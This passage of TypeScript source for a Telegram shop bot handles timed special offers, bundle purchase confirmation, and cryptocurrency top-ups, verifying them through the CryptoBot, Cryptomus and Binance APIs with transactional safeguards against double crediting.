                text += `${formatTimeDigit(h[0])} ${formatTimeDigit(h[1])} <b>:</b> ${formatTimeDigit(m[0])} ${formatTimeDigit(m[1])} <b>:</b> ${formatTimeDigit(s[0])} ${formatTimeDigit(s[1])}\n`;
              }
            }

            if (offer.description) text += `<i>${offer.description}</i>\n`;
            text += `━━━━━━━━━━━━━━━\n\n`;

            keyboard.inline_keyboard.push([{ text: `🎁 Claim Your Offer ($${priceUSD})`, callback_data: `buy_offer_${offer.id}` }]);
          }

          keyboard.inline_keyboard.push([{ text: '🔙 Back', callback_data: 'profile_refresh' }]);

          if (messageId) {
            try {
              await targetBot.editMessageText(text, {
                chat_id: chatIdVal,
                message_id: messageId,
                parse_mode: 'HTML',
                reply_markup: keyboard
              });
            } catch (err: any) {
              if (err.message && err.message.includes("message is not modified")) {
                // Ignore
              } else {
                console.error("Error editing special offers:", err);
                stopSpecialOfferTimer(chatIdVal);
              }
            }
          } else {
            const sentMsg = await targetBot.sendMessage(chatIdVal, text, {
              parse_mode: 'HTML',
              reply_markup: keyboard
            });
            return sentMsg;
          }
        };

        try {
          stopSpecialOfferTimer(chatId);
          const sent = await sendOrEditOffers(chatId);
          if (sent?.message_id) {
            const interval = setInterval(() => {
              sendOrEditOffers(chatId, sent.message_id);
            }, 1000);
            activeSpecialOfferTimers.set(chatId, interval);
          }
        } catch (err) {
          console.error("Critical error in special_offers bot logic:", err);
        }
        return;
      }

      if (data.startsWith('buy_offer_')) {
        const offerId = parseInt(data.substring(10));
        const offer = await storage.getSpecialOffer(offerId);
        if (!offer || offer.status !== 'active') {
          await targetBot.sendMessage(chatId, "⚠️ Offer not found or expired.");
          return;
        }

        if (tgUser.balance < offer.price) {
          const lowBalanceMsg = `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Insufficient Balance!</b>\n\n` +
            `Your current balance is <b>$${(tgUser.balance / 100).toFixed(2)}</b>, but this offer costs <b>$${(offer.price / 100).toFixed(2)}</b>.\n\n` +
            `Please top up your account to continue. <tg-emoji emoji-id="5201692367437974073">💵</tg-emoji>`;

          await targetBot.sendMessage(chatId, lowBalanceMsg, {
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: [[{ text: '💰 Add Now (Top-up)', callback_data: 'add_funds' }]]
            }
          });
          return;
        }

        // 2. Stock Check
        const stock = await storage.getCredentialsByProduct(offer.productId);
        const availableStock = stock.filter(c => c.status === 'available');
        if (availableStock.length < offer.bundleQuantity) {
          await targetBot.sendMessage(chatId, `❌ Not enough stock for this bundle. (Required: ${offer.bundleQuantity}, Available: ${availableStock.length})`);
          return;
        }

        // 3. Clear Tracking & Full Message Update (To stop Timers permanently for this message)
        // Also stop the interactive menu timer
        if (activeSpecialOfferTimers.has(chatId)) {
          clearInterval(activeSpecialOfferTimers.get(chatId)!);
          activeSpecialOfferTimers.delete(chatId);
        }

        await storage.updateTelegramUser(tgUser.id, {
          lastOfferBroadcastId: null, // This stops the Global Timer
          lastAction: `confirming_offer_${offerId}`
        });

        // Stop Fast Timer if exists
        if (activeSessionTimers.has(tgUser.telegramId)) {
          clearInterval(activeSessionTimers.get(tgUser.telegramId)!);
          activeSessionTimers.delete(tgUser.telegramId);
        }

        const confirmKeyboard = {
          inline_keyboard: [
            [{ text: '✅ Confirm Purchase', callback_data: `confirm_offer_${offerId}` }],
            [{ text: '❌ Cancel', callback_data: 'cancel_purchase' }]
          ]
        };

        const confirmText = `<tg-emoji emoji-id="6276134137963222688">🎁</tg-emoji> <b>${offer.name}</b>\n\n` +
          `<tg-emoji emoji-id="5201692367437974073">💎</tg-emoji> Bundle Price: <b>$${(offer.price / 100).toFixed(2)}</b>\n\n` +
          `Please confirm your purchase below: <tg-emoji emoji-id="5231102735817918643">🤍</tg-emoji>`;

        try {
          await targetBot.editMessageText(confirmText, {
            chat_id: chatId,
            message_id: query.message?.message_id,
            parse_mode: 'HTML',
            reply_markup: confirmKeyboard
          });
        } catch (err) {
          await targetBot.sendMessage(chatId, confirmText, {
            parse_mode: 'HTML',
            reply_markup: confirmKeyboard
          });
        }
        return;
      }

      if (data === 'add_funds') {
        try {
          if (query.message) {
            await targetBot.deleteMessage(chatId, query.message.message_id);
          }
        } catch (err) { }

        const keyboard: any[] = [
          [
            { text: 'CryptoBot', callback_data: 'payment_cryptobot', icon_custom_emoji_id: '5361543877599724417' },
            { text: 'Cryptomus', callback_data: 'payment_cryptomus', icon_custom_emoji_id: '5341506639688126935' }
          ],
          [
            { text: 'Binance Pay', callback_data: 'payment_binance', icon_custom_emoji_id: '6235482598924095547' }
          ]
        ];

        await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="5201692367437974073">💰</tg-emoji> <b>Select Payment Method:</b>`, {
          parse_mode: 'HTML',
          reply_markup: { inline_keyboard: keyboard }
        });
        return;
      }

      if (data === 'payment_cryptobot') {
        try {
          if (query.message) {
            await targetBot.deleteMessage(chatId, query.message.message_id);
          }
        } catch (err) { }

        const keyboard: any[][] = [
          [
            { text: '1', callback_data: 'cryptobot_amount_1', icon_custom_emoji_id: '5409048419211682843' },
            { text: '5', callback_data: 'cryptobot_amount_5', icon_custom_emoji_id: '5409048419211682843' },
            { text: '10', callback_data: 'cryptobot_amount_10', icon_custom_emoji_id: '5409048419211682843' }
          ],
          [
            { text: 'Custom', callback_data: 'cryptobot_amount_custom', icon_custom_emoji_id: '5814427657609153890' }
          ]
        ];

        const prompt = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="5361543877599724417">🤖</tg-emoji> Enter amount for <b>@CryptoBot</b> deposit in USD (<tg-emoji emoji-id="5201692367437974073">💵</tg-emoji>):`, {
          parse_mode: 'HTML',
          reply_markup: { inline_keyboard: keyboard }
        });
        await storage.updateTelegramUserByChatId(chatId.toString(), {
          lastAction: 'awaiting_cryptobot_amount_selection',
          lastMessageId: prompt?.message_id
        });
        return;
      }

      if (data.startsWith('cryptobot_amount_')) {
        const val = data.replace('cryptobot_amount_', '');
        if (val === 'custom') {
          try {
            if (query.message) {
              await targetBot.deleteMessage(chatId, query.message.message_id);
            }
          } catch (e) { }
          const prompt = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="5361543877599724417">🤖</tg-emoji> Enter custom amount for <b>@CryptoBot</b> deposit in USD (<tg-emoji emoji-id="5201692367437974073">💵</tg-emoji>):`, { parse_mode: 'HTML' });
          await storage.updateTelegramUserByChatId(chatId.toString(), {
            lastAction: 'awaiting_cryptobot_amount',
            lastMessageId: prompt?.message_id
          });
          return;
        }

        const amount = parseFloat(val);
        if (isNaN(amount) || amount <= 0) return;

        try {
          if (query.message) {
            await targetBot.deleteMessage(chatId, query.message.message_id);
          }
        } catch (e) { }

        const newPayment = await storage.createPayment({
          telegramUserId: tgUser.id,
          amount: Math.round(amount * 100),
          paymentMethod: 'cryptobot',
          status: 'pending'
        });

        const res = await createCryptoBotInvoice(amount, newPayment.id.toString());
        await storage.updateTelegramUser(tgUser.id, { lastAction: null });

        if (res.success && res.payUrl) {
          if (res.invoiceId) {
            await storage.updatePayment(newPayment.id, { externalId: res.invoiceId.toString() });
          }
          const msgText = `<tg-emoji emoji-id="5361543877599724417">🤖</tg-emoji> <b>@CryptoBot Top-up Invoice</b>\n` +
            `➖➖➖➖➖➖➖➖➖➖\n` +
            `<tg-emoji emoji-id="5370919202796348364">▪️</tg-emoji> Top-up amount: <b>$${amount.toFixed(2)} USD</b>\n` +
            `<tg-emoji emoji-id="5370919202796348364">▪️</tg-emoji> Status: <tg-emoji emoji-id="6010111371251815589">⏳</tg-emoji> Pending\n` +
            `➖➖➖➖➖➖➖➖➖➖\n` +
            `Click on the button below to pay via <b>@CryptoBot</b>:`;

          const keyboard: any[][] = [
            [{ text: `Pay $${amount.toFixed(2)} via @CryptoBot`, url: res.payUrl, icon_custom_emoji_id: '5361543877599724417' }],
            [{ text: 'Check top-up', callback_data: `check_payment_${newPayment.id}`, icon_custom_emoji_id: '6010111371251815589' }]
          ];

          const imagePath = path.resolve(process.cwd(), 'public/assets/cryptobot.png');
          try {
            await sendPhotoWithCache(targetBot, chatId, imagePath, 'FILE_ID_CRYPTOBOT', {
              caption: msgText,
              parse_mode: 'HTML',
              reply_markup: {
                inline_keyboard: keyboard
              }
            });
          } catch (photoErr) {
            await targetBot.sendMessage(chatId, msgText, {
              parse_mode: 'HTML',
              reply_markup: {
                inline_keyboard: keyboard
              }
            });
          }
        } else {
          targetBot.sendMessage(chatId, `❌ Failed to create @CryptoBot invoice: ${res.error || 'Please check admin settings'}`);
        }
        return;
      }

      if (data === 'payment_binance') {
        try {
          if (query.message) {
            await targetBot.deleteMessage(chatId, query.message.message_id);
          }
        } catch (err) { }

        const method = 'Binance';

        try {
          if (tgUser?.lastMessageId) {
            await targetBot.deleteMessage(chatId, tgUser.lastMessageId).catch(() => { });
          }
        } catch (err) { }

        const prompt = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="5296437653770608702">💰</tg-emoji> Enter amount for ${method} (USDT <tg-emoji emoji-id="5201692367437974073">💵</tg-emoji>):`, {
          parse_mode: 'HTML'
        });
        await storage.updateTelegramUserByChatId(chatId.toString(), {
          lastAction: `awaiting_binance_deposit_amount`,
          lastMessageId: prompt?.message_id
        });
        return;
      }

      if (data === 'payment_cryptomus') {
        try {
          if (query.message) {
            await targetBot.deleteMessage(chatId, query.message.message_id);
          }
        } catch (err) { }

        const keyboard: any[][] = [
          [
            { text: '1', callback_data: 'cryptomus_amount_1', icon_custom_emoji_id: '5409048419211682843' },
            { text: '5', callback_data: 'cryptomus_amount_5', icon_custom_emoji_id: '5409048419211682843' },
            { text: '10', callback_data: 'cryptomus_amount_10', icon_custom_emoji_id: '5409048419211682843' }
          ],
          [
            { text: 'Custom', callback_data: 'cryptomus_amount_custom', icon_custom_emoji_id: '5814427657609153890' }
          ]
        ];

        const prompt = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="5341506639688126935">💰</tg-emoji> Enter amount for <b>Cryptomus</b> deposit in USD (<tg-emoji emoji-id="5201692367437974073">💵</tg-emoji>):`, {
          parse_mode: 'HTML',
          reply_markup: { inline_keyboard: keyboard }
        });
        await storage.updateTelegramUserByChatId(chatId.toString(), {
          lastAction: 'awaiting_cryptomus_amount_selection',
          lastMessageId: prompt?.message_id
        });
        return;
      }

      if (data.startsWith('cryptomus_amount_')) {
        const val = data.replace('cryptomus_amount_', '');
        if (val === 'custom') {
          try {
            if (query.message) {
              await targetBot.deleteMessage(chatId, query.message.message_id);
            }
          } catch (e) { }
          const prompt = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="5341506639688126935">💰</tg-emoji> Enter custom amount for <b>Cryptomus</b> deposit in USD (<tg-emoji emoji-id="5201692367437974073">💵</tg-emoji>):`, { parse_mode: 'HTML' });
          await storage.updateTelegramUserByChatId(chatId.toString(), {
            lastAction: 'awaiting_cryptomus_amount',
            lastMessageId: prompt?.message_id
          });
          return;
        }

        const amount = parseFloat(val);
        if (isNaN(amount) || amount <= 0) return;

        try {
          if (query.message) {
            await targetBot.deleteMessage(chatId, query.message.message_id);
          }
        } catch (e) { }

        await processCryptomusInvoiceCreation(targetBot, chatId, tgUser, amount);
        return;
      }

      if (data === 'payment_trc20') {
        try { if (query.message) await targetBot.deleteMessage(chatId, query.message.message_id); } catch (e) {}
        const wallet = (await storage.getSetting('TRC20_WALLET_ADDRESS'))?.value;
        if (!wallet) {
          await targetBot.sendMessage(chatId, '❌ TRC20 wallet not configured. Contact support.');
          return;
        }
        const prompt = await targetBot.sendMessage(chatId,
          `<tg-emoji emoji-id="5296437653770608702">💰</tg-emoji> <b>TRC20 (USDT) Deposit</b>\n\nEnter the <b>USDT amount</b> you want to deposit (USD <tg-emoji emoji-id="5201692367437974073">💵</tg-emoji>):`,
          { parse_mode: 'HTML' }
        );
        await storage.updateTelegramUserByChatId(chatId.toString(), {
          lastAction: 'awaiting_trc20_amount',
          lastMessageId: prompt?.message_id
        });
        return;
      }

      if (data === 'payment_aptos') {
        try { if (query.message) await targetBot.deleteMessage(chatId, query.message.message_id); } catch (e) {}
        const wallet = (await storage.getSetting('APTOS_WALLET_ADDRESS'))?.value;
        if (!wallet) {
          await targetBot.sendMessage(chatId, '❌ Aptos wallet not configured. Contact support.');
          return;
        }
        const prompt = await targetBot.sendMessage(chatId,
          `<tg-emoji emoji-id="5798849051017352095">⚡</tg-emoji> <b>Aptos (USDT) Deposit</b>\n\nEnter the <b>USDT amount</b> you want to deposit (USD <tg-emoji emoji-id="5201692367437974073">💵</tg-emoji>):`,
          { parse_mode: 'HTML' }
        );
        await storage.updateTelegramUserByChatId(chatId.toString(), {
          lastAction: 'awaiting_aptos_amount',
          lastMessageId: prompt?.message_id
        });
        return;
      }

      if (data.startsWith('check_payment_')) {
        const paymentId = parseInt(data.substring(14));
        const paymentCheck = await storage.getPayment(paymentId);

        if (paymentCheck && paymentCheck.paymentMethod === 'cryptobot') {
          if (paymentCheck.status === 'completed') {
            await targetBot.answerCallbackQuery(query.id, { text: "Payment already verified!", show_alert: true }).catch(() => {});
            return;
          }

          if (!paymentCheck.externalId) {
            await targetBot.answerCallbackQuery(query.id, { text: "Payment not found yet.", show_alert: true }).catch(() => {});
            return;
          }

          const check = await checkCryptoBotInvoiceStatus(paymentCheck.externalId);
          if (check.paid) {
            // ATOMIC DB UPDATE TO PREVENT DOUBLE CREDITING
            const [updatedPayment] = await db.update(payments)
              .set({ status: 'completed', updatedAt: new Date() })
              .where(and(eq(payments.id, paymentCheck.id), ne(payments.status, 'completed')))
              .returning();

            if (updatedPayment) {
              await db.execute(sql`UPDATE telegram_users SET balance = balance + ${updatedPayment.amount} WHERE id = ${updatedPayment.telegramUserId}`);
              await targetBot.answerCallbackQuery(query.id, { text: `✅ Payment verified! $${(updatedPayment.amount / 100).toFixed(2)} credited.`, show_alert: true }).catch(() => {});
              await targetBot.sendMessage(chatId, `✅ <b>@CryptoBot Payment Verified!</b>\n\n💰 Credited: <b>$${(updatedPayment.amount / 100).toFixed(2)}</b> has been added to your balance. Thank you! 🤍`, { parse_mode: 'HTML' });

              try {
                if (query.message) {
                  const updatedCaption = `<tg-emoji emoji-id="5361543877599724417">🤖</tg-emoji> <b>@CryptoBot Top-up Invoice</b>\n` +
                    `➖➖➖➖➖➖➖➖➖➖\n` +
                    `<tg-emoji emoji-id="5370919202796348364">▪️</tg-emoji> Top-up amount: <b>$${(updatedPayment.amount / 100).toFixed(2)} USD</b>\n` +
                    `<tg-emoji emoji-id="5370919202796348364">▪️</tg-emoji> Status: <tg-emoji emoji-id="6276090299232031662">✅</tg-emoji> <b>Successful</b>\n` +
                    `➖➖➖➖➖➖➖➖➖➖\n` +
                    `<b>Payment Verified! Balance updated.</b>`;
                  await targetBot.editMessageCaption(updatedCaption, {
                    chat_id: chatId,
                    message_id: query.message.message_id,
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [] }
                  }).catch(() => {});
                }
              } catch (e) {}

              const userDisplayName = tgUser?.firstName || tgUser?.username || "User";
              io.emit('admin_notification', {
                type: 'deposit',
                title: 'New @CryptoBot Deposit',
                message: `${userDisplayName} deposited $${(updatedPayment.amount / 100).toFixed(2)} via @CryptoBot`,
                data: { paymentId: updatedPayment.id, userId: tgUser?.telegramId, amount: updatedPayment.amount / 100, txId: paymentCheck.externalId }
              });

              sendAdminPushNotification(
                'New @CryptoBot Deposit',
                `${userDisplayName} deposited $${(updatedPayment.amount / 100).toFixed(2)}`
              ).catch(console.error);
            } else {
              await targetBot.answerCallbackQuery(query.id, { text: "Payment already verified!", show_alert: true }).catch(() => {});
            }
          } else {
            await targetBot.answerCallbackQuery(query.id, { text: "Payment not found yet.", show_alert: true }).catch(() => {});
          }
          return;
        }

        // Atomically lock and transition payment status to processing for TRC20 / Aptos / Binance / Cryptomus
        const payment = await db.transaction(async (tx) => {
          const [p] = await tx.select().from(payments).where(eq(payments.id, paymentId)).for('update');
          if (!p) return null;
          if (p.status !== 'pending') return p;

          const [updated] = await tx.update(payments)
            .set({ status: 'processing', updatedAt: new Date() })
            .where(eq(payments.id, paymentId))
            .returning();
          return updated;
        });

        if (!payment || payment.status !== 'processing') {
          const failMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Payment request is already being processed, expired, or completed.</b>`, { parse_mode: 'HTML' });
          setTimeout(() => {
            targetBot.deleteMessage(chatId, failMsg.message_id).catch(() => {});
          }, 15000);
          return;
        }

        // Expiration Check: 1 Hour
        const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
        if (payment.createdAt && new Date(payment.createdAt) < oneHourAgo) {
          await storage.updatePayment(payment.id, { status: 'expired' });
          await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>This payment request has expired (1 hour limit). Please create a new one.</b>`, { parse_mode: 'HTML' });
          return;
        }

        if (payment.paymentMethod === 'trc20' || payment.paymentMethod === 'aptos') {
          // Revert processing status to pending so it can be checked
          await storage.updatePayment(payment.id, { status: 'pending' });

          const promptMsgText = `<tg-emoji emoji-id="5334982154868783692">📝</tg-emoji> <b>Enter your Transaction ID (TXID)</b>\n\nOur system will automatically detect your payment. Please copy and paste your TXID / Transaction Hash directly here:`;
          const promptMsg = await targetBot.sendMessage(chatId, promptMsgText, { parse_mode: 'HTML' });

          await storage.updateTelegramUserByChatId(chatId.toString(), {
            lastAction: `awaiting_${payment.paymentMethod}_txid_${payment.id}_0`,
            lastMessageId: promptMsg?.message_id
          });
          return;
        }

        // Send "Checking payment..." message in chat
        let checkingMsg: TelegramBot.Message | undefined;
        try {
          const userForDelete = await storage.getTelegramUser(userId);
          if (userForDelete?.lastErrorMessageId) {
            await targetBot.deleteMessage(chatId, userForDelete.lastErrorMessageId).catch(() => { });
            await storage.updateTelegramUser(userForDelete.id, { lastErrorMessageId: null });
          }
          checkingMsg = await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6010111371251815589">⏳</tg-emoji> <b>Checking payment...</b> Please wait.`, { parse_mode: 'HTML' });
        } catch (e) { }

        try {
          if (payment.paymentMethod === 'binance') {
            const apiKey = (await storage.getSetting('BINANCE_API_KEY'))?.value;
            const secretKey = (await storage.getSetting('BINANCE_SECRET_KEY'))?.value;

            if (!apiKey || !secretKey) {
              await storage.updatePayment(payment.id, { status: 'pending' });
              if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });
              await targetBot.sendMessage(chatId, "⚠️ Automatic verification is not configured for Binance. Please contact support.");
              return;
            }

            const timestamp = Date.now();
            const queryStr = `timestamp=${timestamp}`;
            const signature = crypto
              .createHmac('sha256', secretKey)
              .update(queryStr)
              .digest('hex');

            const response = await axios.get(`https://api.binance.com/sapi/v1/pay/transactions?${queryStr}&signature=${signature}`, {
              headers: {
                'X-MBX-APIKEY': apiKey,
                'Content-Type': 'application/json'
              }
            });

            if (response.data && response.data.code === '000000' && Array.from(response.data.data).length > 0) {
              const transactions = response.data.data;
              const expectedAmount = (payment.amount / 100).toString();
              const userIdStr = tgUser.telegramId;

              // Get already processed external IDs for this user to avoid duplicate matching
              const processedExternalIds = (await db.select({ extId: payments.externalId })
                .from(payments)
                .where(and(eq(payments.telegramUserId, tgUser.id), eq(payments.status, 'completed'))))
                .map(p => p.extId);

              const match = transactions.find((tx: any) => {
                const txAmount = tx.amount;
                const txNote = tx.note || tx.memo || "";
                return txAmount === expectedAmount && txNote.includes(userIdStr) && !processedExternalIds.includes(tx.orderId);
              });

              if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });

              if (match) {
                // Check if this transaction has already been used for a payment
                const existingSuccess = await db.select().from(payments).where(and(eq(payments.externalId, match.orderId), eq(payments.status, 'completed'))).limit(1);
                if (existingSuccess.length > 0) {
                  await storage.updatePayment(payment.id, { status: 'pending' });
                  await targetBot.sendMessage(chatId, "⚠️ This transaction has already been credited to your account.");
                  return;
                }

                // Lock user and complete payment atomically
                await db.transaction(async (tx) => {
                  const [u] = await tx.select().from(telegramUsers).where(eq(telegramUsers.id, tgUser.id)).for('update');
                  if (u) {
                    await tx.update(telegramUsers).set({ balance: u.balance + payment.amount }).where(eq(telegramUsers.id, u.id));
                  }
                  await tx.update(payments).set({
                    status: 'completed',
                    externalId: match.orderId,
                    updatedAt: new Date()
                  }).where(eq(payments.id, payment.id));
                });

                await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6276090299232031662">✅</tg-emoji> <b>Binance payment verified!</b> $${expectedAmount} has been added to your balance.`, { parse_mode: 'HTML' });
              } else {
                await storage.updatePayment(payment.id, { status: 'pending' });
                const failMsg = `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Binance transaction not found.</b>\n\nPlease ensure you included your User ID in the Note field and transferred the exact amount. <tg-emoji emoji-id="6298544405435387645">❌</tg-emoji>`;
                const sentMsg = await targetBot.sendMessage(chatId, failMsg, { parse_mode: 'HTML' });
                if (sentMsg) {
                  await storage.updateTelegramUser(tgUser.id, { lastErrorMessageId: sentMsg.message_id });
                  setTimeout(() => {
                    targetBot.deleteMessage(chatId, sentMsg.message_id).catch(() => { });
                  }, 15000);
                }
              }
            } else {
              await storage.updatePayment(payment.id, { status: 'pending' });
              if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });
              const failMsg = `<tg-emoji emoji-id="6298544405435387645">❌</tg-emoji> <b>Binance transaction not found.</b>\n\nPlease ensure you included your User ID in the Note field and transferred the exact amount. <tg-emoji emoji-id="6298544405435387645">❌</tg-emoji>`;
              const sentMsg = await targetBot.sendMessage(chatId, failMsg, { parse_mode: 'HTML' });
              if (sentMsg) {
                await storage.updateTelegramUser(tgUser.id, { lastErrorMessageId: sentMsg.message_id });
                setTimeout(() => {
                  targetBot.deleteMessage(chatId, sentMsg.message_id).catch(() => { });
                }, 15000);
              }
            }
          } else if (payment.paymentMethod === 'cryptomus') {
            const merchantId = (await storage.getSetting('CRYPTOMUS_MERCHANT_ID'))?.value;
            const apiKey = (await storage.getSetting('CRYPTOMUS_API_KEY'))?.value;

            if (!merchantId || !apiKey) {
              await storage.updatePayment(payment.id, { status: 'pending' });
              if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });
              await targetBot.sendMessage(chatId, "⚠️ Automatic verification is not configured for Cryptomus. Please contact support.");
              return;
            }

            try {
              const sign = crypto.createHash('md5').update(Buffer.from(JSON.stringify({
                uuid: payment.cryptomusUuid
              })).toString('base64') + apiKey).digest('hex');

              const response = await axios.post('https://api.cryptomus.com/v1/payment/info', {
                uuid: payment.cryptomusUuid
              }, {
                headers: {
                  'merchant': merchantId,
                  'sign': sign
                }
              });

              if (response.data.result) {
                const status = response.data.result.status;
                if (status === 'paid' || status === 'paid_over') {
                  if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });

                  // ATOMIC DB UPDATE TO PREVENT DOUBLE CREDITING
                  const [updatedPayment] = await db.update(payments)
                    .set({ status: 'completed', updatedAt: new Date() })
                    .where(and(eq(payments.id, payment.id), ne(payments.status, 'completed')))
                    .returning();

                  if (updatedPayment) {
                    await db.execute(sql`UPDATE telegram_users SET balance = balance + ${updatedPayment.amount} WHERE id = ${updatedPayment.telegramUserId}`);
                    await targetBot.sendMessage(chatId, `✅ <b>Cryptomus Payment Verified!</b>\n\n💰 Credited: <b>$${(updatedPayment.amount / 100).toFixed(2)}</b> has been added to your balance. Thank you! 🤍`, { parse_mode: 'HTML' });

                    try {
                      if (query.message) {
                        const updatedText = `<tg-emoji emoji-id="5341506639688126935">💰</tg-emoji> <b>Cryptomus Top-up Invoice</b>\n` +
                          `➖➖➖➖➖➖➖➖➖➖\n` +
                          `<tg-emoji emoji-id="5370919202796348364">▪️</tg-emoji> Top-up amount: <b>$${(updatedPayment.amount / 100).toFixed(2)} USD</b>\n` +
                          `<tg-emoji emoji-id="5370919202796348364">▪️</tg-emoji> Status: <tg-emoji emoji-id="6276090299232031662">✅</tg-emoji> <b>Successful</b>\n` +
                          `➖➖➖➖➖➖➖➖➖➖\n` +
                          `<b>Payment Verified! Balance updated.</b>`;
                        await targetBot.editMessageText(updatedText, {
                          chat_id: chatId,
                          message_id: query.message.message_id,
                          parse_mode: 'HTML',
                          reply_markup: { inline_keyboard: [] }
                        }).catch(() => {});
                      }
                    } catch (e) {}

                    const userDisplayName = tgUser?.firstName || tgUser?.username || "User";
                    io.emit('admin_notification', {
                      type: 'deposit',
                      title: 'New Cryptomus Deposit',
                      message: `${userDisplayName} deposited $${(updatedPayment.amount / 100).toFixed(2)} via Cryptomus`,
                      data: { paymentId: updatedPayment.id, userId: tgUser?.telegramId, amount: updatedPayment.amount / 100, txId: payment.cryptomusUuid }
                    });

                    sendAdminPushNotification(
                      'New Cryptomus Deposit',
                      `${userDisplayName} deposited $${(updatedPayment.amount / 100).toFixed(2)}`
                    ).catch(console.error);
                  } else {
                    await targetBot.sendMessage(chatId, "⚠️ This payment has already been verified and credited to your account.");
                  }
                } else if (status === 'process') {
                  await storage.updatePayment(payment.id, { status: 'pending' });
                  if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });
                  await targetBot.sendMessage(chatId, "⏳ Payment is still processing. Please wait a few minutes and try again.");
                } else if (status === 'cancel' || status === 'fail') {
                  if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });
                  await storage.updatePayment(payment.id, { status: 'failed' });
                  await targetBot.sendMessage(chatId, "❌ Payment was cancelled or failed.");
                } else {
                  await storage.updatePayment(payment.id, { status: 'pending' });
                  if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });
                  await targetBot.sendMessage(chatId, "❌ Payment was not found or is awaiting network confirmation. Try again later");
                }
              }
            } catch (err) {
              await storage.updatePayment(payment.id, { status: 'pending' });
              if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });
              await targetBot.sendMessage(chatId, "❌ Error checking Cryptomus payment status.");
            }
          } else if (payment.paymentMethod === 'trc20') {
            const walletAddress = (await storage.getSetting('TRC20_WALLET_ADDRESS'))?.value;
            if (!walletAddress) {
              await storage.updatePayment(payment.id, { status: 'pending' });
              if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });
              await targetBot.sendMessage(chatId, "⚠️ TRC20 wallet address is not configured. Please contact support.");
              return;
            }

            try {
              const verificationMode = (await storage.getSetting('TRC20_VERIFICATION_MODE'))?.value || 'binance';
              let matched = false;

              if (verificationMode === 'binance') {
                const apiKey = (await storage.getSetting('BINANCE_API_KEY'))?.value;
                const secretKey = (await storage.getSetting('BINANCE_SECRET_KEY'))?.value;

                if (!apiKey || !secretKey) {
                  await storage.updatePayment(payment.id, { status: 'pending' });
                  if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });
                  await targetBot.sendMessage(chatId, "⚠️ Automatic verification is not configured for Binance. Please contact support.");
                  return;
                }

                const timestamp = Date.now();
                const queryStr = `coin=USDT&timestamp=${timestamp}`;
                const signature = crypto
                  .createHmac('sha256', secretKey)
                  .update(queryStr)
                  .digest('hex');

                const res = await axios.get(`https://api.binance.com/sapi/v1/capital/deposit/hisrec?${queryStr}&signature=${signature}`, {
                  headers: {
                    'X-MBX-APIKEY': apiKey,
                    'Content-Type': 'application/json'
                  }
                });

                const deposits = res.data;
                if (deposits && Array.isArray(deposits)) {
                  const expectedAmount = payment.amount / 100;
                  const paymentCreatedAtMs = payment.createdAt ? new Date(payment.createdAt).getTime() : Date.now();

                  for (const d of deposits) {
                    const txId = (d.txId || '').toLowerCase();
                    if (d.status !== 1) continue;
                    if ((d.coin || '').toUpperCase() !== 'USDT') continue;

                    const net = (d.network || '').toUpperCase();
                    if (net !== 'TRX' && net !== 'TRON') continue;

                    const depAddr = (d.address || '').trim();
                    if (depAddr.toLowerCase() !== walletAddress.trim().toLowerCase()) continue;

                    const insertTime = Number(d.insertTime || 0);
                    if (insertTime < paymentCreatedAtMs - 120000) continue;

                    const actualAmount = parseFloat(d.amount);
                    if (isNaN(actualAmount) || Math.abs(actualAmount - expectedAmount) >= 0.001) continue;

                    // Atomic locking transaction
                    const txResult = await db.transaction(async (tx) => {
                      const [settingRow] = await tx.select().from(settings).where(eq(settings.key, 'USED_TXIDS_JSON')).for('update');
                      let currentUsed: string[] = [];
                      if (settingRow?.value) {
                        try { currentUsed = JSON.parse(settingRow.value); } catch(e) {}
                      }
                      if (currentUsed.includes(txId)) {
                        return { success: false, error: "duplicate" };
                      }

                      const [u] = await tx.select().from(telegramUsers).where(eq(telegramUsers.id, tgUser.id)).for('update');
                      if (!u) return { success: false, error: "user_not_found" };

                      currentUsed.push(txId);
                      if (settingRow) {
                        await tx.update(settings).set({ value: JSON.stringify(currentUsed), updatedAt: new Date() }).where(eq(settings.key, 'USED_TXIDS_JSON'));
                      } else {
                        await tx.insert(settings).values({ key: 'USED_TXIDS_JSON', value: JSON.stringify(currentUsed) });
                      }

                      const creditAmountCents = Math.round(actualAmount * 100);
                      await tx.update(telegramUsers).set({
                        balance: u.balance + creditAmountCents,
                        lastAction: null,
                        lastMessageId: null
                      }).where(eq(telegramUsers.id, u.id));

                      await tx.update(payments).set({
                        status: 'completed',
                        externalId: d.txId,
                        amount: creditAmountCents,
                        updatedAt: new Date()
                      }).where(eq(payments.id, payment.id));

                      return { success: true, creditAmountCents };
                    });

                    if (txResult.success) {
                      matched = true;
                      if (checkingMsg) await targetBot.deleteMessage(chatId, checkingMsg.message_id).catch(() => { });

                      await targetBot.sendMessage(chatId, 
